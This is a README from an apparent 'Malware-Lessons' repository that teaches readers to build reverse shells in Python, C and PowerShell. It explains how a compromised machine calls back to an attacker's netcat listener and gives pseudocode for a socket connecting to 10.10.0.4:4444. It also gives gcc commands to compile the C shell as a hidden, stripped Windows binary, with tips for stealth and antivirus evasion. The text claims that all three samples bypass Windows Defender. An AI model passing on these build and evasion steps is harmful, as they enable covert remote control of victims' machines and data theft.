# Reverse Shell

> Reverse shells invert the attack dynamic, turning targeted systems into unwitting accomplices that reach out through their own defenses to hand attackers the keys to the kingdom.

### What is it?

![image](https://github.com/jaekenji/Malware-Lessons/assets/140440974/02d792ea-d856-4c7f-bbc2-ad409ba1f965)

<p>if you need further explanation: its as if you pulled up command prompt on your computer, where the attack runs commands</p>

### Main Components
<p>Target Machine: The computer that has been compromised and is controlled remotely. It runs a reverse shell program that initiates the connection to the attacker’s listener.</p>
<p>Attacker’s Machine (Listener): The server or computer that receives the incoming connection from the target machine. It typically runs a listening service that waits for the reverse shell to connect.</p>
Network Communication: Utilizes standard networking protocols (often TCP/IP) to establish and maintain the connection between the target machine and the attacker's listener. Communication can be disguised or encrypted to evade detection.

The victim will always call back to the attacker with a reverse shell

```powershell
 SEND CONNECTION              WAITING FOR CONNECTION
   LOUSY SCRUB       ----->          ATTACKER
```

Actively, what this might look like in terms code:

```
# Establish a connection
connection = some_socket('10.10.0.4', 4444)

# Receive Bytes
data = connection.recieved_bytes()

# Decode the bytes, run it as a command
output = cmd_process_run(data.decode())

# Send output back to attacker
send_bytes(socket, output.encode())
```

This is kinda what it would look like in powershell or c or python

### Overall Objective
<p>The primary objective of a reverse shell is to allow an attacker to execute commands on a target machine remotely. This capability can be used for various malicious purposes, such as:</p>

- Data Theft: Extracting sensitive data from the target system.
- System Manipulation: Installing malware, creating backdoors, or modifying system configurations.
- Network Exploration: Using the compromised machine to conduct further attacks within the target network.
  
<p>Reverse shells are particularly effective because they initiate the connection from the target to the attacker, often circumventing inbound firewall rules and detection systems that are designed to block unauthorized incoming connections. This makes reverse shells a potent tool for attackers who need stealthy and extensive access to compromised networks.</p>

### now lets get to coding !!!

----

### Python Reverse Shell

#### [Reverse Shell: Python Lesson](https://youtu.be/GT_AgX1jFGs)

###### python scripts (.py) can be ran with python, so no need for compiling

nc is netcat, a command line utility for remote management, can connect or listen for connections

the victim calls back ----------------------------------------------------> to the attacker

https://github.com/jaekenji/Malware-Lessons/assets/140440974/74a077c6-eeb5-4abc-a9e2-302265223bf1

#### Malicious Detection Score:

![image](https://github.com/jaekenji/Malware-Lessons/assets/140440974/5d3426fb-c58d-4124-9173-4406c74c8160)

-----

### C Reverse Shell

#### [Reverse Shell: C Lesson](https://youtu.be/z9A-2n5vfeA)

###### c, we need to compile, so either use visual studio, or gcc

```console
gcc 1_reverse_c.c -o 1_reverse_c.exe -lws2_32
```
###### if you want to be super stealthy, delete the line of code that is ```WaitForSingleObject()``` and compile with this syntax

```console
gcc 1_reverse_c.c -o 1_reverse_c.exe -lws2_32 -mwindows
```

###### to compile in the smallest form possible, we do this:

```console
gcc -Os -s -nostdlib .\1_reverse_c.c -o 1_reverse_c.exe -lws2_32 -lkernel32 "-Wl,--entry,WinMainCRTStartup" "-Wl,--gc-sections"
:: use minGW strip executable to remove any unneeded parts
strip.exe --strip-unneeded reverse_shell4.exe
```
###### this will run the program hidden, and the socket is maintained in memory

###### important note: as the malware gets sneakier, the more likely it is to get flagged as malware

again using netcat to listen for the victim to connect to us

the victim calls back ----------------------------------------------------> to the attacker

https://github.com/jaekenji/Malware-Lessons/assets/140440974/4f3c8924-2d3b-4770-a51b-eaf8120308de

#### Malicious Detection Score:

First compile command:

![image](https://github.com/jaekenji/Malware-Lessons/assets/140440974/297ce607-a736-470a-87c3-2d3e5764c654)

Second compile command:

![image](https://github.com/jaekenji/Malware-Lessons/assets/140440974/63006d34-6a87-4bae-94a0-8942058f3b96)



-----

### PowerShell Reverse Shell

#### [Reverse Shell: PowerShell Lesson](https://youtu.be/SvTbf2eCE8o)

###### powershell scripts (.ps1) can be ran with powershell, no need to compile

last time using

netcat to catch the reverse shells

the victim calls back ----------------------------------------------------> to the attacker

https://github.com/jaekenji/Malware-Lessons/assets/140440974/3e3c37c1-1d09-41bb-a16b-23f8cdef0b49

#### Malware Detection Score:

<p>OK, whats ridiculous about this is I submitted 1 with comments and 1 without</p>

With:

![image](https://github.com/jaekenji/Malware-Lessons/assets/140440974/a83c144f-0f46-443a-a84c-8fcd4f902264)

Without:

![image](https://github.com/jaekenji/Malware-Lessons/assets/140440974/5e52b7ed-f7f7-4e6c-b323-0f82530efe61)

<p>The way powershell scripts get analyzed is so dumb, and you can easily bypass AV with them.</p>

-----

### Concluding

<p>If all 3 reverse shells were practiced, there is now a fundamental understanding in how the reverse shell operates</p>

<p>BTW all of these malwares bypass windows defender</p>

<p>happy hacking</p>
